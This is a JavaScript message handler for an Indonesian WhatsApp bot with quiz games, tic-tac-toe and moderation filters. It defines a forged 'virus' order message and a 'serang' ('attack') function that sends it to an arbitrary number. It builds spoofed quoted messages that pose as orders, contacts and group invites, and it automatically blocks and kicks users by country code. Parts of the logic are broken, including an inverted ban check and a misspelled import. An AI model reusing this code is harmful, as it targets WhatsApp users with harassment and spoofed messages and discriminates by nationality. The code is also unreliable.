/**
   * Base By Dika Ardnt.
   * Recode full by Satganz Devs
   * Follow https://github.com/SatzzBotzz
*/

require('./settings/config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOfdoc } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/myfunc')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
module.exports = satria = async (satria, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°├π÷×¶∆£¢€¥®™+✓_=|~!?@${prefix}$%^&.©^]/gi.test(body) ? body.match(/^[°├π÷×¶∆£¢€¥®™+✓_=|~!?@${prefix}$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const waktu = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
        const salam =`${tanggal} - ${time}`
        const botNumber = await satria.decodeJid(satria.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const tagss = m.sender.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
        const tagsender = "@"+tagss
const vitum= { url : global.visoka }
        // Group
        const groupMetadata = m.isGroup ? await satria.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 99999999,status: 200, thumbnail: thumb, surface: 200, message: `© ${global.ownername}`, orderTitle: 'Satganz Devs', sellerJid: '6281316701742@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":100000000000,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${global.ownername}`, "h": `satria`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${global.ownername}`, 'jpegthumbnail': thumb}}}
		const fgclink = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "120363024644358150@g.us",
"inviteCode": "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC",
"groupName": `${global.botname}`, 
"caption":`${pushname}`, 
'jpegThumbnail': thumb
}
}
}
const fdoc = {
key : {
participant : '0@s.whatsapp.net'
},
message:{
documentMessage: {
title: 'Satganz Devs', 
                    jpegThumbnail: thumb
                          }
                        }
                      }
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegthumbnail': thumb}}}
		const floc = {key : {participant : '6281316701742@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegthumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegthumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
		const ftoko = {
       key: {
                   fromMe: false,
                   participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "17608914335@s.whatsapp.net" } : {})
               },
               message: {
                   "productMessage": {
                       "product": {
                           "productImage":{
                               "mimetype": "image/jpeg",
                               "jpegthumbnail": thumb//Gambarnye
                           },
                           "title": global.ownername, //Kasih namalu 
                           "description": salam, 
                           "currencyCode": "IDR",
                           "priceAmount1000": "20000000",
                           "retailerId": "Ghost",
                           "productImageCount": 1
                       },
                           "businessOwnerJid": `${global.owner}@s.whatsapp.net`
               }
           }
          }
          const ftextt = {
            key: { 
                 fromMe: false,
                 participant: `0@s.whatsapp.net`, ...(m.chat ? 
            { remoteJid: "17608914335-1625305606@g.us" } : {}) 
                       },
            message: { 
               "extendedTextMessage": {
                        "text":global.ownername,
                        "title": global.ownername,
                        'jpegthumbnail': thumb
                               }
                             } 
                            }
               
                   const fliveLoc = {
            key:
            { fromMe: false,
            participant: `0@s.whatsapp.net`, ...(m.chat  ? 
            { remoteJid: "status@broadcast" } : {}) },
            message: { "liveLocationMessage": { "caption":"Satganz Devs","h": `Fuck`, 'jpegthumbnail': thumb}}
           }
               
                  const fliveLoc2 = {
            key:
            { fromMe: false,
            participant: `0@s.whatsapp.net`, ...(m.chat ? 
            { remoteJid: "status@broadcast" } : {}) },
            message: { "liveLocationMessage": { "title": "Hi There Im Using GitHub","h": `Done`, 'jpegthumbnail': thumb}}
           }
		
		const virus =  {
             key: { fromMe: false,remoteJid: "satria@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
     const serang = (teks) => {
           satria.sendMessage(`${teks}@s.whatsapp.net`, { text: teks, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": `https://wa.me/6281316701742`,"thumbnail": thumb,"sourceUrl": "hehe"}}}, { quoted: virus})
           }
           
	const freply = async (teks) => {
			return await satria.sendMessage(m.chat,teks,`Kontol`, pushname,ownername, m)
		}
		const randomArr = (arr = []) => {
            return arr[Math.floor(Math.random() * arr.length)]
	       }
	const ply = async(teks) => {
      await satria.sendMessage(m.chat, { contextInfo: { externalAdReply: {showAdAttribution: true, title: `Hallo ${pushname}`, body: `satria`, previewType: 'PHOTO', thumbnail: thumb, sourceUrl:`https://s.satria.repl.co`}}, text: teks, mentions: parseMention(teks)}, {quoted: floc})
}
      
      
      
   
            
        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = ucapan.malam
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = ucapan.malam
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = ucapan.sore
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = ucapan.siang
}
        if(time2 < "10:00:00"){
        var ucapanWaktu = ucapan.pagi
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = ucapan.pagi
}
        if(time2 < "03:00:00"){
        var ucapanWaktu = ucapan.tmalam
}
            
            const reply = (teks) => {satria.sendMessage(m.chat, { text: teks, externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281316701742',
title: '「 ❔ 」',
body: ucapanWaktu,
sourceUrl: global.web, thumbnail: thumb
  }
 }, { quoted: m })}
                 
            
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
                if (!isNumber(user.spam)) user.spam = 0
                if (!('firstchat' in user)) user.firstchat = true
                if (!('banned' in user)) user.banned = false
                if (!isNumber(user.warning)) user.warning = 0
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
                spam: 0,
                firstchat: true,
                banned: false,
                warning:0,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = true
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: true,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
        // banned users
        if (!isCreator && !global.db.data.users[m.sender].banned) {
        	return
        }
       //anti orang gajelas
if (m.sender.startsWith('212' || '212')) {
satria.updateBlockStatus(m.sender, 'block')
m.reply('see u next time')
satria.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
   
if (m.sender.startsWith('92' || '92')) {
satria.updateBlockStatus(m.sender, 'block')
m.reply('see u next time')
satria.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
    
if (m.sender.startsWith('265' || '265')) {
satria.updateBlockStatus(m.sender, 'block')
m.reply('see u next time')
satria.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
    
if (m.sender.startsWith('93' || '93')) {
satria.updateBlockStatus(m.sender, 'block')
m.reply('see u next time')
satria.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
if (!m.message) {
satria.chatRead(m.chat)
}
let badwordRegex =/anj(k|g)|ajn?(g|k)|a?njin(g|k)|bajingan|b(a?n)?gsa?t|ko?nto?l|me?me?(k|q)|pe?pe?(k|q)|meki|titi(t|d)|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|(k|ng)e?nto?(t|d)|jembut|bego|dajj?al|janc(u|o)k|pantek|puki ?(mak)?|kimak|kampang|lonte|col(i|mek?)|pelacur|henceu?t|nigga|fuck|dick|bitch|tits|bastard|asshole/
    let isBadword = badwordRegex.exec(m.text)
    console.log("BADWORD DETECT!!!")
if (isBadword) {
	global.db.data.users[m.sender].warning += 1
let buttons =[{ buttonId: `ok`, buttonText: { displayText: 'Astagfirullah' }, type: 1 }, { buttonId: `cekwarn`, buttonText: { displayText: 'Cek Warning' }, type: 1 }]
satria.sendButtonText(m.chat, buttons, `*📮ᴛᴏxɪᴄ ᴛᴇʀᴅᴇᴛᴇᴋꜱɪ !\nhttps://bit.ly/SatganzDevs*
あ Warning: ${global.db.data.users[m.sender].warning} / 5 ┊

[❗] Jika warning mencapai 5 kamu akan *suspend*

Suspend akan terbuka setelah 24j!\n\n🌸

“Barang siapa yang beriman kepada Allah dan Hari Akhir maka hendaklah dia berkata baik atau diam” (HR. al-Bukhari dan Muslim).`, global.footer, m)
}
if (global.db.data.users[m.sender].warning >= 5) {
	await sleep(3000)
            global.db.data.users[m.sender].banned = true
            m.reply("Kamu Di Suspend.")
            await sleep (240000000)
            global.db.data.users[m.sender].banned = false
            global.db.data.users[m.sender].warning = 0
            let buttons =[{ buttonId: `ok`, buttonText: { displayText: 'Alhamdulillah' }, type: 1 }]
satria.sendButtonText(m.chat, buttons,`${ucapanWaktu} - ${pushname} 👋\n\n Selamat Kamu Telah Di Unsuspend`, global.footer, m)
            }
	var satgnz = "allhamdulilah"
let isnoown = new RegExp(satgnz, 'i')
let isOwn = isnoown.test(m.text)
 if (isOwn) {
		let all = {url : "https://a.uguu.se/ahGderba.mp3"}
   satria.sendMessage(m.chat, {audio: all, mimetype:'audio/mpeg', ptt:true }, {quoted:fvn})
   }
	          if (isCmd) {
		let emojti =['😀','😃','😄','😁','😆','😅','😂','🤣','😊','☺','😇','🙂','🙃','😉','😌','🥰','😍','😘','😗','😚']
		let emoji = emojti[Math.floor(Math.random() * emojti.length)]
reactionMessage = {
                    react: {
                        text: emoji,
                        key: { remoteJid: m.chat, fromMe: false, id: quoted.id }
                    }
                }
                satria.sendMessage(m.chat, reactionMessage)
            }
            
            if (/^a(s|ss)alamu('|)alaikum$/.test(budy?.toLowerCase())) {
            const jawab_salam = [
                'Wa\'alaikumusalam',
                'Wa\'alaikumusalam wrb',
                'Wa\'alaikumusalam Warohmatulahi Wabarokatuh',
            ]
            satria.sendMessage(m.chat, {audio: { url : "https://a.uguu.se/qvmYuAMt.mp3" }, mimetype:'audio/mpeg', ptt:true }, {quoted:ftoko})
        }
        // Public & Self
        if (!satria.public) {
            if (!m.key.fromMe) return
        }
                
                
        // First Chat
if (global.db.data.users[m.sender].firstchat) {
let buttons =[{ buttonId: `.menu`, buttonText: { displayText: 'Menu' }, type: 1 },{ buttonId: `owner`, buttonText: { displayText: 'Owner' }, type: 1 }]
satria.sendButtonText(m.chat, buttons, `${ucapanWaktu} - ${pushname} 👋\n\n💬 Ada yg bisa ${botname} bantu?`, global.footer, m)
global.db.data.users[m.sender].firstchat = false
await sleep(240000000)
global.db.data.users[m.sender].firstchat = true
}
// Auto Read2
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await satria.setStatus(`${global.footer}\n\n\n\n\n\n | Runtime : ${runtime(process.uptime())}`)
		setting.status = new Date() * 1
	    }
	}
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await satria.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        satria.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
       
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
                
        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: satria.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, satria.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        satria.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            satria.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await satria.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, global.footer, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await satria.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await satria.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    satria.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    satria.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) satria.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) satria.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) satria.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    satria.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) satria.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) satria.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    satria.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	     let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
